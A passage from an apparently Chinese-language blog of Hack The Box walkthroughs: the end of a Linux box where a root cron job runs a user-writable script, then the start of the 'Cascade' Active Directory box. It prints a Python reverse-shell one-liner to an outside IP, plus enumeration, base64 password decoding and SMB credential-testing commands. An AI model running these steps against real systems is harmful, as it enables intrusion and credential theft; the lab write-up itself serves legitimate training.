-i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:15:01 sun CRON[4843]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:17:01 sun CRON[4855]: (root) CMD (   <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)<br>Apr  8 02:20:01 sun CRON[4865]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br></code></pre></td></tr></table></figure><p>便于读者阅读，其中关键的信息我筛选了出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br>Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br>Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;<br></code></pre></td></tr></table></figure><p>看起来每过5分钟root用户便会以自身root权限去执行python &#x2F;home&#x2F;sun&#x2F;Documents&#x2F;script.py并将其输出到&#x2F;home&#x2F;sun&#x2F;output.txt，然而script.py是sun用户目录中的，sun对其是拥有完全控制权，也就是说我可以将其更改为我希望执行的python代码，例如用python建立一个反向shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.3&quot;,1334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &gt;&gt; script.py<br></code></pre></td></tr></table></figure><p>等一会儿，便可如愿以偿的收到反向shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 1334<br>listening on [any] 1334 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 37434<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string"># whoami</span><br><span class="hljs-string">root</span><br><span class="hljs-string">#cd root</span><br><span class="hljs-string"># ls</span><br><span class="hljs-string">root.txt</span><br><span class="hljs-string">script.py</span><br><span class="hljs-string"># cat root</span><br><span class="hljs-string">cat: root: No such file or directory</span><br><span class="hljs-string"># cat root.txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough Cascade</title>
    <link href="/post/HackTheBox-Cascade.html"/>
    <url>/post/HackTheBox-Cascade.html</url>
    
    <content type="html"><![CDATA[<p>You′re never a loser until you quit trying.</p><p>在停止尝试之前，你永远不是失败者。</p><h4 id="Hack-The-Box-Cascade"><a href="#Hack-The-Box-Cascade" class="headerlink" title="Hack The Box - Cascade"></a>Hack The Box - Cascade</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92 scan initiated Sun Apr 24 20:24:15 2022 as: nmap -sV -sC -p- -Pn -T4 -oA nmap.txt 10.10.10.182</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.182<br>Host is up (0.20s latency).<br>Not shown: 65520 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br>| dns-nsid: <br>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-24 12:28:13Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49158/tcp open  msrpc         Microsoft Windows RPC<br>49170/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   2.1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-04-24T12:29:11<br>|_  start_date: 2022-04-24T12:22:25<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Apr 24 20:29:54 2022 -- 1 IP address (1 host up) scanned in 339.82 seconds</span><br></code></pre></td></tr></table></figure><p>从Nmap的信息中我能读取到，目标的域为cascade.local。</p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS:"></a>DNS:</h4><p>我可以尝试区域传输，不出意料会失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dig axfr @10.10.10.182 cascade.local   <br><br>; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.182 cascade.local<br>; (1 server found)<br>;; global options: +cmd<br>; Transfer failed.<br></code></pre></td></tr></table></figure><h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC:"></a>RPC:</h4><h5 id="枚举用户名："><a href="#枚举用户名：" class="headerlink" title="枚举用户名："></a>枚举用户名：</h5><p>RPC如果不指定-N跳过密码验证的话，会不被允许访问，但是如果附加上 -N 就会被允许访问，我可以枚举一些用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> 10.10.10.182 -N<br>rpcclient $&gt; enumdomusers<br>user:[CascGuest] rid:[0x1f5]<br>user:[arksvc] rid:[0x452]<br>user:[s.smith] rid:[0x453]<br>user:[r.thompson] rid:[0x455]<br>user:[util] rid:[0x457]<br>user:[j.wakefield] rid:[0x45c]<br>user:[s.hickson] rid:[0x461]<br>user:[j.goodhand] rid:[0x462]<br>user:[a.turnbull] rid:[0x464]<br>user:[e.crowe] rid:[0x467]<br>user:[b.hanson] rid:[0x468]<br>user:[d.burman] rid:[0x469]<br>user:[BackupSvc] rid:[0x46a]<br>user:[j.allen] rid:[0x46e]<br>user:[i.croft] rid:[0x46f]<br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>这样我就获取到了一本用户名字典，即使它们的名字看起来都很怪。</p><h5 id="枚举组："><a href="#枚举组：" class="headerlink" title="枚举组："></a>枚举组：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; enumdomgroups<br>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]<br>group:[Domain Users] rid:[0x201]<br>group:[Domain Guests] rid:[0x202]<br>group:[Domain Computers] rid:[0x203]<br>group:[Group Policy Creator Owners] rid:[0x208]<br>group:[DnsUpdateProxy] rid:[0x44f]<br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>系统版本被拒绝了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; srvinfo <br>Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br></code></pre></td></tr></table></figure><p>枚举共享也被拒绝了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; netshareenum<br>Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br></code></pre></td></tr></table></figure><p>我尝试获取DC主机名，也失败了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; getanydcname cascade.local<br>result was WERR_INVALID_COMPUTERNAME<br>rpcclient $&gt; getdcname cascade.local<br>result was WERR_NERR_DCNOTFOUND<br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>RPC可以枚举很多很多东西，甚至可以添加用户，更改用户密码，但是都因为权限不够失败了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; getanydcname cascade.local<br>result was WERR_INVALID_COMPUTERNAME<br>rpcclient $&gt; getdcname cascade.local<br>result was WERR_NERR_DCNOTFOUND<br>rpcclient $&gt; getdcname htb.local<br>result was WERR_NERR_DCNOTFOUND<br>rpcclient $&gt; gettrustrid<br>result was WERR_ACCESS_DENIED<br>rpcclient $&gt; adddriver<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumports<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumdata<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumjobs<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumforms<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumalsgroups<br>Usage: enumalsgroups <span class="hljs-built_in">builtin</span>|domain [access mask] [max_size]<br>rpcclient $&gt; chgpasswd<br>Usage: chgpasswd username oldpass newpass<br>result was NT_STATUS_INVALID_PARAMETER<br>rpcclient $&gt; enumkey <br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumjobs<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; enumprocs<br>Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED <br></code></pre></td></tr></table></figure><p>但是我发现了目标中另一个域：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcclient $&gt; enumdomains<br>name:[CASCADE] idx:[0x0]<br>name:[Builtin] idx:[0x0]<br>rpcclient $&gt;<br></code></pre></td></tr></table></figure><p>但是对于当下的我来说没有什么实质性的帮助，当下我的目标是要获取一个合法的域身份。</p><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP:"></a>LDAP:</h4><p>LDAP也是能够获取到很多信息的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ldapsearch -x -b <span class="hljs-string">&quot;dc=cascade,dc=local&quot;</span> -H ldap://10.10.10.182 &gt; ldap.txt<br></code></pre></td></tr></table></figure><p>同时也会有很多对于我来说没什么用的垃圾信息，我可以总结很多搜索技巧，如果我希望搜索很多可以用来登录的用户，我可以搜索关键字<strong>userPrincipalName</strong>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userPrincipalName: CascGuest@cascade.local<br></code></pre></td></tr></table></figure><p>以及远程登录名，比如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sAMAccountName: Guests<br></code></pre></td></tr></table></figure><p>如果要搜索潜藏用户名的话，它们在LDAP返回的信息格式都是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &lt;名字&gt; &lt;类型&gt; &lt;所属域&gt;</span><br></code></pre></td></tr></table></figure><p>像这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># DnsAdmins, Users, cascade.local</span><br>dn: CN=DnsAdmins,CN=Users,DC=cascade,DC=<span class="hljs-built_in">local</span><br>objectClass: top<br>objectClass: group<br>cn: DnsAdmins<br></code></pre></td></tr></table></figure><p>或是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># MicrosoftDNS, System, cascade.local</span><br>dn: CN=MicrosoftDNS,CN=System,DC=cascade,DC=<span class="hljs-built_in">local</span><br>objectClass: top<br>objectClass: container<br>cn: MicrosoftDNS<br></code></pre></td></tr></table></figure><p>又或者这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Read-only Domain Controllers, Users, cascade.local</span><br>dn: CN=Read-only Domain Controllers,CN=Users,DC=cascade,DC=<span class="hljs-built_in">local</span><br><br><span class="hljs-comment"># Enterprise Read-only Domain Controllers, Users, cascade.local</span><br>dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=cascade,DC=<span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><p>如果服务账户会长这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ArkSvc, Services, Users, UK, cascade.local</span><br>dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=<span class="hljs-built_in">local</span><br>objectClass: top<br>objectClass: person<br></code></pre></td></tr></table></figure><p>如果是正常用户会长这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Steve Smith, Users, UK, cascade.local</span><br>dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=<span class="hljs-built_in">local</span><br>objectClass: top<br>objectClass: person<br>objectClass: organizationalPerson<br>.....<br>sAMAccountName: s.smith<br>sAMAccountType: 805306368<br>userPrincipalName: s.smith@cascade.local<br></code></pre></td></tr></table></figure><p>在不断搜寻间，我发现了Ryan Thompson用户，他的远程登录名为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sAMAccountName: r.thompson<br></code></pre></td></tr></table></figure><p>他的域内登录名为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userPrincipalName: r.thompson@cascade.local<br></code></pre></td></tr></table></figure><p>让我注意到他的是因为他的信息中有一条：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cascadeLegacyPwd: clk0bjVldmE=<br></code></pre></td></tr></table></figure><p>确切的说是pwd让我很敏感。他看起来像是base64的编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;clk0bjVldmE=&quot;</span> | <span class="hljs-built_in">base64</span> -d <br>rY4n5eva<br></code></pre></td></tr></table></figure><p>似乎我获取到了一个口令。而且这似乎是该用户独有的属性，或许这是作者留给我的，至于LDAP返回给了我多少信息，我可以截个图切身实际感受一下：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424212815644.png" alt="image-20220424212815644"  />#### SMB：<p>SMB不被允许匿名访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.182 -u <span class="hljs-built_in">whoami</span><br>[!] Authentication error on 10.10.10.182<br></code></pre></td></tr></table></figure><p>但是我可以尝试刚刚获取到的口令，crackmapexec可以为我快速的枚举一些东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva                               <br>SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)<br>SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva<br></code></pre></td></tr></table></figure><p>但是winrm不行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva<br>SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)<br>HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman<br>WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva<br></code></pre></td></tr></table></figure><p>winrm不行意味着我无法通过evil-winrm登录到目标：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>Error: An error of <span class="hljs-built_in">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError<br><br>Error: Exiting with code 1<br></code></pre></td></tr></table></figure><p>或许我应该在smb中找到其他答案：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva<br>[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      <br>      Disk                                                    Permissions     Comment<br>      ----                                                    -----------     -------<br>      ADMIN$                                                  NO ACCESS       Remote Admin<br>      Audit$                                                  NO ACCESS<br>      C$                                                      NO ACCESS       Default share<br>      Data                                                    READ ONLY<br>      IPC$                                                    NO ACCESS       Remote IPC<br>      NETLOGON                                                READ ONLY       Logon server share <br>      <span class="hljs-built_in">print</span>$                                                  READ ONLY       Printer Drivers<br>      SYSVOL                                                  READ ONLY       Logon server share <br></code></pre></td></tr></table></figure><p>Data会很引人注意，很明显它是被人为放上来的而不是默认共享。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.182/Data -U r.thompson<br>Enter WORKGROUP\r.thompson<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; DIR</span><br><span class="hljs-string">.                                   D        0  Mon Jan 27 11:27:34 2020</span><br><span class="hljs-string">..                                  D        0  Mon Jan 27 11:27:34 2020</span><br><span class="hljs-string">Contractors                         D        0  Mon Jan 13 09:45:11 2020</span><br><span class="hljs-string">Finance                             D        0  Mon Jan 13 09:45:06 2020</span><br><span class="hljs-string">IT                                  D        0  Wed Jan 29 02:04:51 2020</span><br><span class="hljs-string">Production                          D        0  Mon Jan 13 09:45:18 2020</span><br><span class="hljs-string">Temps                               D        0  Mon Jan 13 09:45:15 2020</span><br><span class="hljs-string"></span><br><span class="hljs-string">              6553343 blocks of size 4096. 1625321 blocks available</span><br><span class="hljs-string">smb: \&gt; cd Temps\</span><br><span class="hljs-string">smb: \Temps\&gt; dir</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \Temps\*</span><br></code></pre></td></tr></table></figure><p>有些目录依旧会因为权限被拒绝，但是我发现了一个有趣的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \IT\Temp\s.smith\&gt; <span class="hljs-built_in">dir</span><br>.                                   D        0  Wed Jan 29 04:00:01 2020<br>..                                  D        0  Wed Jan 29 04:00:01 2020<br>VNC Install.reg                     A     2680  Wed Jan 29 03:27:44 2020<br><br>              6553343 blocks of size 4096. 1624934 blocks available<br>smb: \IT\Temp\s.smith\&gt; get <span class="hljs-string">&quot;VNC Install.reg&quot;</span> <br>getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (1.8 KiloBytes/sec) (average 1.9 KiloBytes/sec)<br>smb: \IT\Temp\s.smith\&gt; <br></code></pre></td></tr></table></figure><p>windows的空格一直是个问题，我还会发现一个会议记录html：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \IT\&gt; <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;Email Archives&quot;</span><br>smb: \IT\Email Archives\&gt; <span class="hljs-built_in">ls</span><br>.                                   D        0  Wed Jan 29 02:00:30 2020<br>..                                  D        0  Wed Jan 29 02:00:30 2020<br>Meeting_Notes_June_2018.html       An     2522  Wed Jan 29 02:00:12 2020<br><br>              6553343 blocks of size 4096. 1625190 blocks available<br>smb: \IT\Email Archives\&gt; get Meeting_Notes_June_2018.html <br>getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)<br>smb: \IT\Email Archives\&gt;<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424214947971.png" alt="image-20220424214947971"  /><p>TempAdmin与普通管理员密码相同。而在另一份reg文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">Windows Registry Editor Version 5.00<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]<br><span class="hljs-string">&quot;ExtraPorts&quot;</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-string">&quot;QueryTimeout&quot;</span>=dword:0000001e<br><span class="hljs-string">&quot;QueryAcceptOnTimeout&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;LocalInputPriorityTimeout&quot;</span>=dword:00000003<br><span class="hljs-string">&quot;LocalInputPriority&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;BlockRemoteInput&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;BlockLocalInput&quot;</span>=dword:00000000<br><span class="hljs-string">&quot;IpAccessControl&quot;</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-string">&quot;RfbPort&quot;</span>=dword:0000170c<br><span class="hljs-string">&quot;HttpPort&quot;</span>=dword:000016a8<br><span class="hljs-string">&quot;DisconnectAction&quot;</span>=dword:00000000<br><span 